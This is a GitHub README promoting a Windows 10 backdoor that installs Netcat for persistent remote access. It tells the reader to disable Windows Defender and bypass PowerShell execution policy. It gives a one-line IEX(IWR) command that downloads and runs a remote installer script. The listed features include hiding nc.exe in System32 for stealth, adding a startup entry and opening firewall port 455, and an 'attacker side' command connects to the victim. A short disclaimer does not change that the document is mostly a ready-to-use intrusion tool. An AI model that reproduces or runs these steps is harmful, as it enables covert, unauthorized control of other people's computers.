# PermanentRevershell-win10backdoor
 "PermanentRevershell: A potent Windows 10 backdoor providing persistent access and full system control. Explore its capabilities today!"
![image](https://github.com/alariordas/PermanentRevershell-win10backdoor/assets/80034759/82e62466-3dff-4a75-b90d-51602e27e753)

**Disclaimer: Use Responsibly**

This tool is provided for educational and legitimate security testing purposes only. The author (insert your name or username) does not condone or endorse any unauthorized or malicious use of this tool. Any actions and activities carried out using this tool are the sole responsibility of the user.

By downloading, using, or distributing this tool, you acknowledge and agree to use it in compliance with all applicable laws and ethical guidelines. Improper or unlawful use of this tool is strictly prohibited, and the author will not be held responsible for any consequences arising from such actions.

Please exercise caution and always obtain proper authorization before using this tool on systems or networks that you do not own or have explicit permission to test.

Use this tool responsibly and for legitimate purposes only.

**Note:** It is important to be aware of and comply with the laws and regulations governing cybersecurity and ethical hacking activities in your jurisdiction. Unauthorized access or malicious activities may result in legal consequences.





# Netcat Auto-Installer for Windows

This script automates the installation of Netcat on Windows systems. Netcat is a versatile networking utility that can be used for various purposes, including network testing and security assessments. Please use this script responsibly and only on systems and networks for which you have proper authorization.

## Features

- Downloads and extracts the Netcat ZIP file to a temporary location.
- Moves the `nc.exe` binary to the `System32` directory, enhancing its stealth.
- Sets up Netcat to run at system startup for persistent access.
- Enables a firewall rule to allow incoming connections on port 455.
- Removes temporary files after successful installation

## Prerequisites

Before using this script, ensure that you have:

- Windows operating system.
- Administrator privileges.
- Windows Defender desactivated during the execution of the script
- PowerShell enabled for script execution. You can do this by running:

```powershell
Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
```
Or Press `Windows + R` and type:
```powershell
powershell -nop -ep bypass -c IEX(IWR Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force -UseBasicParsing);
````

## Usage

### Automated Installation

1. Press `Windows + R` to open the Run dialog.
2. Type ```powershell.exe  IEX(IWR https://raw.githubusercontent.com/alariordas/PermanentRevershell-win10backdoor/main/ncinstaller.ps1 -UseBasicParsing);``` and press `Ctrl + Enter` to open PowerShell with Administrator privileges.

```powershell
powershell.exe  IEX(IWR https://raw.githubusercontent.com/alariordas/PersistentReverseShell-Win10Backdoor/main/ncinstaller.ps1 -UseBasicParsing);
```

The script will be executed automatically. However, please note that it may not work on all systems. If you encounter issues, you may need to adapt the script to the target system's properties.

### In the Attacker side
Execute this command in the terminal, replace `explample.com` with the victim ip or domain
```cmd
netcat -z -v example.com 455
```
